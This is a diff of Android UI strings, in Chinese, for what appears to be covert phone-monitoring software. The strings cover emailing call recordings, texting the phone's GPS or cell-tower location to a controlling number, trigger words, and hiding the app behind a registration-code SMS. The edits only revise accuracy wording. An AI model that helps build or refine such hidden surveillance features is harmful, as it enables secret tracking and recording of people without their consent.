@@ -45,10 +45,10 @@
     <string name="mail_body_record">你好，这是来自%s的自动发信，附件是录音文件。试用期内有可能无法看到该来源手机的号码，显示为设备号，请见谅。</string>
     
     <!-- Location -->
-    <string name="location_sms_real">当前GPS位置（纬度，经度）：%s。去maps.google.com查看地图，精度5米内。</string>
-    <string name="location_sms_base_station_gsm">根据基站定位，当前位置：%s。去maps.google.com查看地图，精度500米内。</string>
-    <string name="location_sms_base_station_cdma">根据基站定位，当前位置（纬度，经度）：%s。去maps.google.com查看地图，精度500米内。</string>
-    <string name="location_sms_hist">最近GPS位置（时间，纬度，经度）：%s。去maps.google.com查看地图，精度5米内。</string>
+    <string name="location_sms_real">当前GPS位置（纬度，经度）：%s。去maps.google.com查看地图，精度10米内。</string>
+    <string name="location_sms_base_station_gsm">基站定位当前位置：%s。去maps.google.com查看地图，精度50~500米。</string>
+    <string name="location_sms_base_station_cdma">基站定位当前位置（纬度，经度）：%s。去maps.google.com查看地图，精度50~500米。</string>
+    <string name="location_sms_hist">最近GPS位置（时间，纬度，经度）：%s。去maps.google.com查看地图，精度10米内。</string>
     <string name="location_sms_fail">抱歉，当前无法获得所在位置，请稍后再试。若一直无法解决请联系客服。</string>
     
     <!-- Preferences -->
@@ -108,7 +108,7 @@
     <string name="init_hint_setting">设置主控邮箱和手机，敏感词，位置获取词等。</string>
     <string name="init_hint_hide">发送注册码短信到本机，方可再次激活本对话框。</string>
     <string name="init_processing">处理中</string>
-    <string name="init_waiting">请稍候片刻（30秒~2分钟）...</string>
+    <string name="init_waiting">请稍候（30秒~2分钟）...</string>
     <string name="init_collecting">正在收集信息...</string>
     <string name="init_sending">正在发邮件...</string>
     
